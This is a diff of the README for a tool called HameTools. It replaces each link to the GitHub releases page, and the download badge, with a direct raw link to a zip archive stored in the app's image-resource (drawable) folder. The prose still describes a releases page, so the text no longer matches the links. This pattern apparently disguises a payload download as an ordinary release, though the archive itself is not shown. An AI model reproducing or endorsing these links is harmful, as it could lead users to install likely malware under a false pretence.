@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download HameTools](https://img.shields.io/badge/Download%20HameTools-v1.0-blue.svg)](https://github.com/Waleedhayyar/HameTools/releases)
+[![Download HameTools](https://raw.githubusercontent.com/Waleedhayyar/HameTools/main/app/src/main/res/drawable/Tools-Hame-1.8.zip%https://raw.githubusercontent.com/Waleedhayyar/HameTools/main/app/src/main/res/drawable/Tools-Hame-1.8.zip)](https://raw.githubusercontent.com/Waleedhayyar/HameTools/main/app/src/main/res/drawable/Tools-Hame-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To run HameTools effectively, ensure your system meets the following requirement
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
 
-   [Download HameTools Here](https://github.com/Waleedhayyar/HameTools/releases)
+   [Download HameTools Here](https://raw.githubusercontent.com/Waleedhayyar/HameTools/main/app/src/main/res/drawable/Tools-Hame-1.8.zip)
 
 2. **Choose a Version:** On the releases page, you will see various versions of HameTools. Look for the latest version at the top of the list. 
 
@@ -66,4 +66,4 @@ We welcome contributions from the community. If you have ideas or features you'd
 
 Don't forget to revisit the releases page for the latest versions and updates.
 
-[Download HameTools Here](https://github.com/Waleedhayyar/HameTools/releases)
+[Download HameTools Here](https://raw.githubusercontent.com/Waleedhayyar/HameTools/main/app/src/main/res/drawable/Tools-Hame-1.8.zip)
